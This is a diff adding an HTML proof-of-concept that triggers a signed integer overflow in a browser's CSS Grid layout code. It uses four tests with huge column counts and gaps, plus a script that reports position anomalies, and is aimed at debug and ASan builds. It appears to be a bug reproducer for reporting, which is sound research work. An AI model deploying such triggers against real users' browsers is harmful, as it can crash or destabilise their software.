@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<!--
+  PoC: Integer overflow in CSS Grid track position accumulation
+  Target: nsGridContainerFrame.cpp lines 4316-4320, 7676-7678
+
+  This version uses multiple techniques to make the overflow observable.
+
+  WARNING: May cause visual glitches or crash in debug/ASan builds.
+
+  BEST TESTED WITH:
+  - Debug build (assertion failure)
+  - ASan build (reports signed-integer-overflow)
+  - ./mach run --debug
+-->
+<html>
+<head>
+<meta charset="utf-8">
+<title>Grid Track Position Overflow PoC v2</title>
+<style>
+body { font-family: monospace; margin: 20px; }
+.note { padding: 10px; margin: 10px 0; border: 2px solid blue; background: #e0e0ff; }
+
+/* Test 1: Intrinsic sizing path (NS_UNCONSTRAINEDSIZE)
+   500 tracks * 80000px * 60au + 499 * 50000px * 60au = 3.9B au > INT32_MAX */
+.test1-wrap { float: left; clear: both; }
+.test1 {
+  display: grid;
+  grid-template-columns: repeat(500, 80000px);
+  gap: 50000px;
+}
+.test1 > div { grid-column: 400; background: red; height: 20px; width: 100px; }
+
+/* Test 2: Constrained path - extreme gap
+   199 gaps * 300000px * 60au = 3.58B au > INT32_MAX */
+.test2 {
+  display: grid; width: 500px; overflow: hidden; height: 30px;
+  grid-template-columns: repeat(200, 1fr);
+  gap: 300000px;
+}
+.test2 > div { grid-column: 150; background: blue; height: 20px; }
+
+/* Test 3: SumOfGridGaps overflow
+   9998 * 500000px * 60au = 300B au (massive overflow) */
+.test3 {
+  display: grid; width: 500px; overflow: hidden; height: 30px;
+  grid-template-columns: repeat(9999, 1px);
+  gap: 500000px;
+}
+.test3 > div { grid-column: 5000; background: green; height: 20px; }
+
+/* Test 4: auto-fill repeat count overflow */
+.test4 {
+  display: grid; width: 1000px; overflow: hidden; height: 30px;
+  grid-template-columns: repeat(auto-fill, 300000px);
+  gap: 300000px;
+}
+.test4 > div { background: orange; height: 20px; }
+</style>
+</head>
+<body>
+
+<h1>Grid Layout Integer Overflow PoC</h1>
+
+<div class="note">
+  <strong>How to observe:</strong> This PoC triggers signed integer overflow (undefined behavior)
+  in nsGridContainerFrame's track position accumulation. Effects vary by build type:
+  <ul>
+    <li><strong>Debug build:</strong> Assertion failure (crash with stack trace)</li>
+    <li><strong>ASan/UBSan build:</strong> Reports signed-integer-overflow</li>
+    <li><strong>Release build:</strong> May show layout glitches or nothing visible (UB is silent)</li>
+  </ul>
+  Run with <code>./mach run --debug</code> or build with <code>--enable-address-sanitizer</code>.
+</div>
+
+<h2>Test 1: Intrinsic sizing path</h2>
+<p>500 tracks * 80000px + 499 gaps * 50000px = overflow at track ~358</p>
+<div class="test1-wrap">
+  <div class="test1">
+    <div id="t1">Track 400</div>
+  </div>
+</div>
+<div style="clear:both"></div>
+
+<h2>Test 2: Constrained path with extreme gap</h2>
+<p>199 gaps * 300000px = overflow in gap sum</p>
+<div class="test2">
+  <div id="t2">Track 150</div>
+</div>
+
+<h2>Test 3: SumOfGridGaps massive overflow</h2>
+<p>9998 gaps * 500000px = 300 billion app units</p>
+<div class="test3">
+  <div id="t3">Track 5000</div>
+</div>
+
+<h2>Test 4: auto-fill repeat count overflow</h2>
+<div class="test4">
+  <div id="t4">Auto-fill</div>
+</div>
+
+<h2>Results</h2>
+<pre id="results"></pre>
+
+<script>
+requestAnimationFrame(function() {
+  var out = document.getElementById('results');
+  var lines = [];
+
+  var ids = ['t1', 't2', 't3', 't4'];
+  for (var i = 0; i < ids.length; i++) {
+    var el = document.getElementById(ids[i]);
+    var r = el.getBoundingClientRect();
+    var status = (r.left < 0 || r.width <= 0) ? ' ** ANOMALY DETECTED **' : ' (normal)';
+    lines.push('Test ' + (i+1) + ': left=' + r.left + ' width=' + r.width + ' top=' + r.top + status);
+  }
+
+  lines.push('');
+  lines.push('Note: In release builds, UB may produce no visible effect.');
+  lines.push('Use a debug or ASan build for definitive proof.');
+  out.textContent = lines.join('\n');
+});
+</script>
+
+</body>
+</html>
